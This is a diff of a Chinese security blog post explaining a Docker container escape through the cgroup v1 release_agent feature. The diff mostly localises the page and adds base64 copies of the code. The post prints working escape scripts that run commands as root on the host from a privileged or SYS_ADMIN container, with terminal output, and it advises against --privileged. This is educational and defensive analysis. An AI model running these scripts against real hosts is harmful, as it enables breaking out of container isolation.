@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
@@ -19,19 +19,22 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/red/pace-theme-minimal.css">
   <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"lucifer11.xyz","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"lucifer11.xyz","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="Felix Wilhelm最近的一条关于概念验证(PoC)“容器逃逸”的推文激起了兴趣，因为进行了类似的研究，并好奇这个PoC会如何影响Kubernetes。  Felix’s poc on tweets   Felix的tweeter展示了一个漏洞，该漏洞从一个使用–privileged flag运行的Docker容器中启动主机上的进程。PoC通过滥用Linux cgroup v1的“发布通知">
+    <meta name="description" content="逐段解释 cgroup v1 release_agent 实验的环境、代码和宿主权限变化。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="理解Docker容器逃逸">
 <meta property="og:url" content="https://lucifer11.xyz/2020/12/14/Understanding-Docker-container-escapes/index.html">
 <meta property="og:site_name" content="0xfd&#39;s blog">
-<meta property="og:description" content="Felix Wilhelm最近的一条关于概念验证(PoC)“容器逃逸”的推文激起了兴趣，因为进行了类似的研究，并好奇这个PoC会如何影响Kubernetes。  Felix’s poc on tweets   Felix的tweeter展示了一个漏洞，该漏洞从一个使用–privileged flag运行的Docker容器中启动主机上的进程。PoC通过滥用Linux cgroup v1的“发布通知">
-<meta property="og:locale" content="en_US">
+<meta property="og:description" content="逐段解释 cgroup v1 release_agent 实验的环境、代码和宿主权限变化。">
+<meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2020-12-14T06:22:41.000Z">
-<meta property="article:modified_time" content="2020-12-14T08:37:07.556Z">
+<meta property="article:modified_time" content="2020-12-14T06:22:41.000Z">
 <meta property="article:author" content="253">
-<meta property="article:tag" content="linux提权">
+<meta property="article:tag" content="Capabilities">
+<meta property="article:tag" content="Docker">
+<meta property="article:tag" content="cgroups">
+<meta property="article:tag" content="容器逃逸">
 <meta name="twitter:card" content="summary">
 
 
@@ -39,7 +42,7 @@
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://lucifer11.xyz/2020/12/14/Understanding-Docker-container-escapes/","path":"2020/12/14/Understanding-Docker-container-escapes/","title":"理解Docker容器逃逸"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://lucifer11.xyz/2020/12/14/Understanding-Docker-container-escapes/","path":"2020/12/14/Understanding-Docker-container-escapes/","title":"理解Docker容器逃逸"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
 <title>理解Docker容器逃逸 | 0xfd's blog</title>
@@ -54,6 +57,7 @@
 <meta name="color-scheme" content="dark">
 <link rel="stylesheet" href="/css/cyberpunk.css">
 <script src="/js/gargantua.js" defer></script>
+<script src="/js/reader.js" defer></script>
 
   <noscript>
     <link rel="stylesheet" href="/css/noscript.css">
@@ -68,7 +72,7 @@
     <div class="column">
       <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
   <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    <div class="toggle" aria-label="切换导航栏" role="button">
         <span class="toggle-line"></span>
         <span class="toggle-line"></span>
         <span class="toggle-line"></span>
@@ -87,7 +91,7 @@
   </div>
 
   <div class="site-nav-right">
-    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
         <i class="fa fa-search fa-fw fa-lg"></i>
     </div>
   </div>
@@ -96,9 +100,9 @@
 
 
 <nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-知识库"><a href="/knowledge/" rel="section"><i class="fa fa-book fa-fw"></i>知识库</a></li><li class="menu-item menu-item-导读"><a href="/guide/" rel="section"><i class="fa fa-compass fa-fw"></i>导读</a></li><li class="menu-item menu-item-分类"><a href="/categories/" rel="section"><i class="fa fa-folder-open fa-fw"></i>分类</a></li><li class="menu-item menu-item-标签"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-归档"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-关于"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
       <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
         </a>
       </li>
   </ul>
@@ -113,7 +117,7 @@
   </span>
   <div class="search-input-container">
     <input autocomplete="off" autocapitalize="off" maxlength="80"
-           placeholder="Searching..." spellcheck="false"
+           placeholder="搜索..." spellcheck="false"
            type="search" class="search-input">
   </div>
   <span class="popup-btn-close" role="button">
@@ -138,10 +142,10 @@
     <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
-          Table of Contents
+          文章目录
         </li>
         <li class="sidebar-nav-overview">
-          Overview
+          站点概览
         </li>
       </ul>
 
@@ -157,25 +161,25 @@
     <img class="site-author-image" itemprop="image" alt="253"
       src="/images/fifteen-katana-zero-katana-zero.gif">
   <p class="site-author-name" itemprop="name">253</p>
-  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+  <div class="site-description" itemprop="description">漏洞分析、利用机制、二进制研究与安全工程</div>
 </div>
 <div class="site-state-wrap animated">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">214</span>
-          <span class="site-state-item-name">posts</span>
+          <span class="site-state-item-count">83</span>
+          <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">78</span>
-        <span class="site-state-item-name">categories</span></a>
+        <span class="site-state-item-count">65</span>
+        <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">41</span>
-        <span class="site-state-item-name">tags</span></a>
+        <span class="site-state-item-count">312</span>
+        <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
 </div>
@@ -208,7 +212,7 @@
 
         </div>
       </div>
-        <div class="back-to-top animated" role="button" aria-label="Back to top">
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
           <i class="fa fa-arrow-up"></i>
           <span>0%</span>
         </div>
@@ -218,7 +222,7 @@
     <div class="sidebar-inner sidebar-blogroll">
       <div class="links-of-blogroll animated">
         <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
-          Links
+          链接
         </div>
         <ul class="links-of-blogroll-list">
             <li class="links-of-blogroll-item">
@@ -248,7 +252,7 @@
   
   
 
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://lucifer11.xyz/2020/12/14/Understanding-Docker-container-escapes/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -258,12 +262,12 @@
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="0xfd's blog">
-      <meta itemprop="description" content="All things about infosec & ctf">
+      <meta itemprop="description" content="漏洞分析、利用机制、二进制研究与安全工程">
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
       <meta itemprop="name" content="理解Docker容器逃逸 | 0xfd's blog">
-      <meta itemprop="description" content="">
+      <meta itemprop="description" content="逐段解释 cgroup v1 release_agent 实验的环境、代码和宿主权限变化。">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
@@ -276,46 +280,50 @@
       <span class="post-meta-item-icon">
         <i class="far fa-calendar"></i>
       </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
+      <span class="post-meta-item-text">发表于</span>
 
-      <time title="Created: 2020-12-14 14:22:41 / Modified: 16:37:07" itemprop="dateCreated datePublished" datetime="2020-12-14T14:22:41+08:00">2020-12-14</time>
+      <time title="创建时间：2020-12-14 14:22:41" itemprop="dateCreated datePublished" datetime="2020-12-14T14:22:41+08:00">2020-12-14</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-folder"></i>
       </span>
-      <span class="post-meta-item-text">In</span>
+      <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/linux%E6%8F%90%E6%9D%83/" itemprop="url" rel="index"><span itemprop="name">linux提权</span></a>
+          <a href="/categories/%E4%BA%91%E4%B8%8E%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">云与容器安全</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E4%BA%91%E4%B8%8E%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E4%B8%8E%E7%BC%96%E6%8E%92/" itemprop="url" rel="index"><span itemprop="name">容器与编排</span></a>
         </span>
     </span>
 
   
-    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
       <span class="post-meta-item-icon">
         <i class="far fa-eye"></i>
       </span>
-      <span class="post-meta-item-text">Views: </span>
+      <span class="post-meta-item-text">阅读次数：</span>
       <span id="busuanzi_value_page_pv"></span>
     </span>
     <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="Word count in article">
+    <span class="post-meta-item" title="本文字数">
       <span class="post-meta-item-icon">
         <i class="far fa-file-word"></i>
       </span>
-      <span class="post-meta-item-text">Word count in article: </span>
+      <span class="post-meta-item-text">本文字数：</span>
       <span>2.3k</span>
     </span>
-    <span class="post-meta-item" title="Reading time">
+    <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
-      <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>8 mins.</span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>8 分钟</span>
     </span>
 </div>
 
+            <div class="post-description">逐段解释 cgroup v1 release_agent 实验的环境、代码和宿主权限变化。</div>
         </div>
       </header>
 
@@ -332,7 +340,7 @@
 <p>Felix的tweeter展示了一个漏洞，该漏洞从一个使用–privileged flag运行的Docker容器中启动主机上的进程。PoC通过滥用Linux cgroup v1的“发布通知”特性来实现这一点。<br>下面是在主机上启动ps的PoC版本:</p>
 <span id="more"></span>
 
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># spawn a new container to exploit via:</span></span><br><span class="line"><span class="comment"># docker run --rm -it --privileged ubuntu bash</span></span><br><span class="line"> </span><br><span class="line">d=`<span class="built_in">dirname</span> $(<span class="built_in">ls</span> -x /s*/fs/c*/*/r* |<span class="built_in">head</span> -n1)`</span><br><span class="line"><span class="built_in">mkdir</span> -p <span class="variable">$d</span>/w;<span class="built_in">echo</span> 1 &amp;gt;<span class="variable">$d</span>/w/notify_on_release</span><br><span class="line">t=`sed -n <span class="string">&#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27;</span> /etc/mtab`</span><br><span class="line"><span class="built_in">touch</span> /o; <span class="built_in">echo</span> <span class="variable">$t</span>/c &amp;gt;<span class="variable">$d</span>/release_agent;<span class="built_in">printf</span> <span class="string">&#x27;#!/bin/sh\nps &amp;gt;&#x27;</span>&amp;quot;<span class="variable">$t</span>/o&amp;quot; &amp;gt;/c;</span><br><span class="line"><span class="built_in">chmod</span> +x /c;sh -c &amp;quot;<span class="built_in">echo</span> 0 &amp;gt;<span class="variable">$d</span>/w/cgroup.procs&amp;quot;;<span class="built_in">sleep</span> 1;<span class="built_in">cat</span> /o</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash" data-code="IyBzcGF3biBhIG5ldyBjb250YWluZXIgdG8gZXhwbG9pdCB2aWE6CiMgZG9ja2VyIHJ1biAtLXJtIC1pdCAtLXByaXZpbGVnZWQgdWJ1bnR1IGJhc2gKIApkPWBkaXJuYW1lICQobHMgLXggL3MqL2ZzL2MqLyovciogfGhlYWQgLW4xKWAKbWtkaXIgLXAgJGQvdztlY2hvIDEgJmd0OyRkL3cvbm90aWZ5X29uX3JlbGVhc2UKdD1gc2VkIC1uICdzLy4qXHBlcmRpcj1cKFteLF0qXCkuKi9cMS9wJyAvZXRjL210YWJgCnRvdWNoIC9vOyBlY2hvICR0L2MgJmd0OyRkL3JlbGVhc2VfYWdlbnQ7cHJpbnRmICcjIS9iaW4vc2hcbnBzICZndDsnJnF1b3Q7JHQvbyZxdW90OyAmZ3Q7L2M7CmNobW9kICt4IC9jO3NoIC1jICZxdW90O2VjaG8gMCAmZ3Q7JGQvdy9jZ3JvdXAucHJvY3MmcXVvdDs7c2xlZXAgMTtjYXQgL28K"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># spawn a new container to exploit via:</span></span><br><span class="line"><span class="comment"># docker run --rm -it --privileged ubuntu bash</span></span><br><span class="line"> </span><br><span class="line">d=`<span class="built_in">dirname</span> $(<span class="built_in">ls</span> -x /s*/fs/c*/*/r* |<span class="built_in">head</span> -n1)`</span><br><span class="line"><span class="built_in">mkdir</span> -p <span class="variable">$d</span>/w;<span class="built_in">echo</span> 1 &amp;gt;<span class="variable">$d</span>/w/notify_on_release</span><br><span class="line">t=`sed -n <span class="string">&#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27;</span> /etc/mtab`</span><br><span class="line"><span class="built_in">touch</span> /o; <span class="built_in">echo</span> <span class="variable">$t</span>/c &amp;gt;<span class="variable">$d</span>/release_agent;<span class="built_in">printf</span> <span class="string">&#x27;#!/bin/sh\nps &amp;gt;&#x27;</span>&amp;quot;<span class="variable">$t</span>/o&amp;quot; &amp;gt;/c;</span><br><span class="line"><span class="built_in">chmod</span> +x /c;sh -c &amp;quot;<span class="built_in">echo</span> 0 &amp;gt;<span class="variable">$d</span>/w/cgroup.procs&amp;quot;;<span class="built_in">sleep</span> 1;<span class="built_in">cat</span> /o</span><br></pre></td></tr></table></figure>
 
 <p>privileged flag引入了严重的安全问题，利用它的方法依赖于启用docker容器来启动。当使用这个flag时，容器可以完全访问所有设备，并且不受seccomp、AppArmor和Linux功能的限制。</p>
 <p>不要运行带有–privileged的容器。Docker包括独立控制容器privileged的细粒度设置。根据经验，这些关键的安全设置经常被遗忘。有必要了解这些选项如何保护您的容器。</p>
@@ -347,7 +355,7 @@
 <p>SYS_ADMIN功能允许容器执行挂载syscall(请参阅man 7功能)。默认情况下，<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZW5naW5lL3NlY3VyaXR5Lw==">Docker启动的容器具有一组受限制的功能<i class="fa fa-external-link-alt"></i></span>，并且由于这样做的安全风险而不启用SYS_ADMIN功能。</p>
 <p>此外，Docker在默认情况下<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZW5naW5lL3NlY3VyaXR5L2FwcGFybW9yLyN1bmRlcnN0YW5kLXRoZS1wb2xpY2llcw==">使用Docker -default AppArmor策略启动容器<i class="fa fa-external-link-alt"></i></span>，这将<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvY2tlci9kb2NrZXItY2UvYmxvYi92MTguMDkuOC9jb21wb25lbnRzL2VuZ2luZS9wcm9maWxlcy9hcHBhcm1vci90ZW1wbGF0ZS5nbyNMMzU=">防止使用挂载系统调用<i class="fa fa-external-link-alt"></i></span>，即使在容器使用SYS_ADMIN运行时也是如此。</p>
 <p>如果容器使用以下flag运行:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--security-opt apparmor=unconfined --cap-add=SYS_ADMIN</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash" data-code="LS1zZWN1cml0eS1vcHQgYXBwYXJtb3I9dW5jb25maW5lZCAtLWNhcC1hZGQ9U1lTX0FETUlOCg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--security-opt apparmor=unconfined --cap-add=SYS_ADMIN</span><br></pre></td></tr></table></figure>
 <p>那么它很容易受到这种技术的攻击</p>
 <h2 id="使用cgroups来实现漏洞"><a href="#使用cgroups来实现漏洞" class="headerlink" title="使用cgroups来实现漏洞"></a>使用cgroups来实现漏洞</h2><p>Linux cgroups是Docker隔离容器的一种机制。PoC滥用了cgroups v1中的notify_on_release特性的功能，以完全特权root用户的身份运行这个漏洞。</p>
 <p>当cgroup中的最后一个任务离开时(通过退出或附加到另一个cgroup)，将执行release_agent文件中提供的命令。这样做的目的是帮助修剪废弃的cgroup。当调用此命令时，它将作为主机上的完全特权root运行。</p>
@@ -356,7 +364,7 @@
 </ul>
 <h2 id="提取概念证明"><a href="#提取概念证明" class="headerlink" title="提取概念证明"></a>提取概念证明</h2><p>有一种更简单的方法来编写这个漏洞，这样它就可以在不使用–privileged标志的情况下工作。在这个场景中，不能访问–privileged提供的读写cgroup挂载。适应这个场景很容易:自己只需将cgroup挂载为读写状态。这给漏洞增加了一行，但需要的特权更少。</p>
 <p>下面的利用将在主机上执行一个ps aux命令，并将其输出保存到容器中的&#x2F;output文件中。它使用与原始PoC相同的release_agent特性在主机上执行。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># On the host</span></span><br><span class="line">docker run --<span class="built_in">rm</span> -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash</span><br><span class="line"> </span><br><span class="line"><span class="comment"># In the container</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp/cgrp &amp;amp;&amp;amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;amp;&amp;amp; <span class="built_in">mkdir</span> /tmp/cgrp/x</span><br><span class="line"> </span><br><span class="line"><span class="built_in">echo</span> 1 &amp;gt; /tmp/cgrp/x/notify_on_release</span><br><span class="line">host_path=`sed -n <span class="string">&#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27;</span> /etc/mtab`</span><br><span class="line"><span class="built_in">echo</span> &amp;quot;<span class="variable">$host_path</span>/cmd&amp;quot; &amp;gt; /tmp/cgrp/release_agent</span><br><span class="line"> </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/bin/sh&#x27;</span> &amp;gt; /cmd</span><br><span class="line"><span class="built_in">echo</span> &amp;quot;ps aux &amp;gt; <span class="variable">$host_path</span>/output&amp;quot; &amp;gt;&amp;gt; /cmd</span><br><span class="line"><span class="built_in">chmod</span> a+x /cmd</span><br><span class="line"> </span><br><span class="line">sh -c &amp;quot;<span class="built_in">echo</span> \$\$ &amp;gt; /tmp/cgrp/x/cgroup.procs&amp;quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash" data-code="IyBPbiB0aGUgaG9zdApkb2NrZXIgcnVuIC0tcm0gLWl0IC0tY2FwLWFkZD1TWVNfQURNSU4gLS1zZWN1cml0eS1vcHQgYXBwYXJtb3I9dW5jb25maW5lZCB1YnVudHUgYmFzaAogCiMgSW4gdGhlIGNvbnRhaW5lcgpta2RpciAvdG1wL2NncnAgJmFtcDsmYW1wOyBtb3VudCAtdCBjZ3JvdXAgLW8gcmRtYSBjZ3JvdXAgL3RtcC9jZ3JwICZhbXA7JmFtcDsgbWtkaXIgL3RtcC9jZ3JwL3gKIAplY2hvIDEgJmd0OyAvdG1wL2NncnAveC9ub3RpZnlfb25fcmVsZWFzZQpob3N0X3BhdGg9YHNlZCAtbiAncy8uKlxwZXJkaXI9XChbXixdKlwpLiovXDEvcCcgL2V0Yy9tdGFiYAplY2hvICZxdW90OyRob3N0X3BhdGgvY21kJnF1b3Q7ICZndDsgL3RtcC9jZ3JwL3JlbGVhc2VfYWdlbnQKIAplY2hvICcjIS9iaW4vc2gnICZndDsgL2NtZAplY2hvICZxdW90O3BzIGF1eCAmZ3Q7ICRob3N0X3BhdGgvb3V0cHV0JnF1b3Q7ICZndDsmZ3Q7IC9jbWQKY2htb2QgYSt4IC9jbWQKIApzaCAtYyAmcXVvdDtlY2hvIFwkXCQgJmd0OyAvdG1wL2NncnAveC9jZ3JvdXAucHJvY3MmcXVvdDsK"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># On the host</span></span><br><span class="line">docker run --<span class="built_in">rm</span> -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash</span><br><span class="line"> </span><br><span class="line"><span class="comment"># In the container</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp/cgrp &amp;amp;&amp;amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;amp;&amp;amp; <span class="built_in">mkdir</span> /tmp/cgrp/x</span><br><span class="line"> </span><br><span class="line"><span class="built_in">echo</span> 1 &amp;gt; /tmp/cgrp/x/notify_on_release</span><br><span class="line">host_path=`sed -n <span class="string">&#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27;</span> /etc/mtab`</span><br><span class="line"><span class="built_in">echo</span> &amp;quot;<span class="variable">$host_path</span>/cmd&amp;quot; &amp;gt; /tmp/cgrp/release_agent</span><br><span class="line"> </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/bin/sh&#x27;</span> &amp;gt; /cmd</span><br><span class="line"><span class="built_in">echo</span> &amp;quot;ps aux &amp;gt; <span class="variable">$host_path</span>/output&amp;quot; &amp;gt;&amp;gt; /cmd</span><br><span class="line"><span class="built_in">chmod</span> a+x /cmd</span><br><span class="line"> </span><br><span class="line">sh -c &amp;quot;<span class="built_in">echo</span> \$\$ &amp;gt; /tmp/cgrp/x/cgroup.procs&amp;quot;</span><br></pre></td></tr></table></figure>
 
 <h2 id="分解概念证明"><a href="#分解概念证明" class="headerlink" title="分解概念证明"></a>分解概念证明</h2><p>现在了解了使用此技术的需求，并改进了概念利用的证明，逐行介绍它，以演示它是如何工作的。</p>
 <p>为了触发这个漏洞，需要一个cgroup，在这个cgroup中我们可以创建一个release_agent文件，并通过杀死cgroup中的所有进程来触发release_agent调用。最简单的方法是挂载cgroup控制器并创建子cgroup。</p>
@@ -364,21 +372,21 @@
 <p>如果继续执行下面的操作，并得到“mount:&#x2F;tmp&#x2F;cgrp: special device cgroup不存在”，这是因为安装程序没有RDMA cgroup控制器。改变rdma到内存修复它。使用RDMA是因为最初的PoC只是被设计用来与它一起工作的。</p>
 <p>请注意，cgroup控制器是全局资源，可以使用不同的权限挂载多次，在一个挂载中呈现的更改将应用于另一个挂载。</p>
 <p>可以看到“x”子cgroup的创建及其目录列表如下所示。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@b11cf9eab4fd:/<span class="comment"># mkdir /tmp/cgrp &amp;amp;&amp;amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;amp;&amp;amp; mkdir /tmp/cgrp/x</span></span><br><span class="line">root@b11cf9eab4fd:/<span class="comment"># ls /tmp/cgrp/</span></span><br><span class="line">cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks  x</span><br><span class="line">root@b11cf9eab4fd:/<span class="comment"># ls /tmp/cgrp/x</span></span><br><span class="line">cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash" data-code="cm9vdEBiMTFjZjllYWI0ZmQ6LyMgbWtkaXIgL3RtcC9jZ3JwICZhbXA7JmFtcDsgbW91bnQgLXQgY2dyb3VwIC1vIHJkbWEgY2dyb3VwIC90bXAvY2dycCAmYW1wOyZhbXA7IG1rZGlyIC90bXAvY2dycC94CnJvb3RAYjExY2Y5ZWFiNGZkOi8jIGxzIC90bXAvY2dycC8KY2dyb3VwLmNsb25lX2NoaWxkcmVuICBjZ3JvdXAucHJvY3MgIGNncm91cC5zYW5lX2JlaGF2aW9yICBub3RpZnlfb25fcmVsZWFzZSAgcmVsZWFzZV9hZ2VudCAgdGFza3MgIHgKcm9vdEBiMTFjZjllYWI0ZmQ6LyMgbHMgL3RtcC9jZ3JwL3gKY2dyb3VwLmNsb25lX2NoaWxkcmVuICBjZ3JvdXAucHJvY3MgIG5vdGlmeV9vbl9yZWxlYXNlICByZG1hLmN1cnJlbnQgIHJkbWEubWF4ICB0YXNrcwo="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@b11cf9eab4fd:/<span class="comment"># mkdir /tmp/cgrp &amp;amp;&amp;amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;amp;&amp;amp; mkdir /tmp/cgrp/x</span></span><br><span class="line">root@b11cf9eab4fd:/<span class="comment"># ls /tmp/cgrp/</span></span><br><span class="line">cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks  x</span><br><span class="line">root@b11cf9eab4fd:/<span class="comment"># ls /tmp/cgrp/x</span></span><br><span class="line">cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks</span><br></pre></td></tr></table></figure>
 
